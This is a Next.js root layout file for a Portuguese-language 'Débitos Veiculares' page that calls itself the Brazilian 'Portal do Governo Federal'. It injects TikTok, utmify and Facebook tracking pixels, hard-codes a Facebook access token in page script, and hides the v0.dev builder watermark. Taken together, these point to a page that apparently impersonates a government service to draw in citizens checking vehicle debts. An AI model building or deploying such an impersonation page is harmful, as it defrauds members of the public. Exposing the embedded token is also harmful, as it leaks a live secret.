import type React from "react"
import type { Metadata } from "next"
import "./globals.css"

export const metadata: Metadata = {
  title: "Débitos Veiculares - Portal do Governo Federal",
  description: "Consulta de débitos veiculares - Portal do Governo Federal",
  generator: "Portal Governo Federal",
  keywords: "débitos veiculares, IPVA, multas, licenciamento, governo federal",
  authors: [{ name: "Portal do Governo Federal" }],
  creator: "Portal do Governo Federal",
  publisher: "Portal do Governo Federal",
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="pt-BR">
      <head>
        <title>Débitos Veiculares - Portal do Governo Federal</title>
        <meta name="description" content="Consulta de débitos veiculares - Portal do Governo Federal" />
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4N2PCBC77U10O2JGH0G');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->
<script>
  window.tikTokPixelId = "692e32897307151ceb234f25";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
        <script
          src="https://cdn.utmify.com.br/scripts/utms/latest.js"
          data-utmify-prevent-xcod-sck
          data-utmify-prevent-subids
          async
          defer
        />

        <script
          dangerouslySetInnerHTML={{
            __html: `
            window.pixelId = "691fccaed46a6da35c4852ae";
            var a = document.createElement("script");
            a.setAttribute("async", "");
            a.setAttribute("defer", "");
            a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
            document.head.appendChild(a);
          `,
          }}
        />

        <script
          dangerouslySetInnerHTML={{
            __html: `
            !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '879004231264780');
            fbq('track', 'PageView');
            
            window.fbAccessToken = 'EAAD5G522ZCHIBQIESY9cPR9C6fxOIQDH9C4LsdluZAW5V3iaHoKLmJonsKk7cSIHux3lelIebkQSNUhRegPzddEZBbBSMEow4ZBgnSSQazNsKsT52u2Hr71rA9pYn2bYEZBwzONqmqIJ5EGBSNUpyOdSpRG37ZB7Ulv4zljg0d7Yh50sRdr7IyWmHcifi4IMkHZAQZDZD';
          `,
          }}
        />
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=879004231264780&ev=PageView&noscript=1"
          />
        </noscript>

        {/* Hide v0 watermark and branding */}
        <style
          dangerouslySetInnerHTML={{
            __html: `
            [data-v0-watermark],
            [data-v0-branding],
            [data-v0-badge],
            .v0-watermark,
            .v0-branding,
            .v0-badge,
            div[style*="position: fixed"][style*="bottom"][style*="right"]:has(a[href*="v0.dev"]),
            div[style*="position: fixed"][style*="z-index"]:has(span:contains("Built with")),
            div[style*="position: fixed"]:has(span:contains("v0")),
            a[href*="v0.dev"],
            *:has(> a[href*="v0.dev"]) {
              display: none !important;
              visibility: hidden !important;
              opacity: 0 !important;
              pointer-events: none !important;
            }
            
            /* Additional selectors for common watermark patterns */
            div[style*="position: fixed"][style*="bottom: 16px"][style*="right: 16px"],
            div[style*="position: fixed"][style*="bottom: 20px"][style*="right: 20px"],
            div[style*="position: fixed"][style*="z-index: 999"],
            div[style*="position: fixed"][style*="z-index: 9999"] {
              display: none !important;
            }
          `,
          }}
        />

        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
        <link rel="icon" href="/favicon.ico" />
      </head>
      <body>{children}</body>
    </html>
  )
}
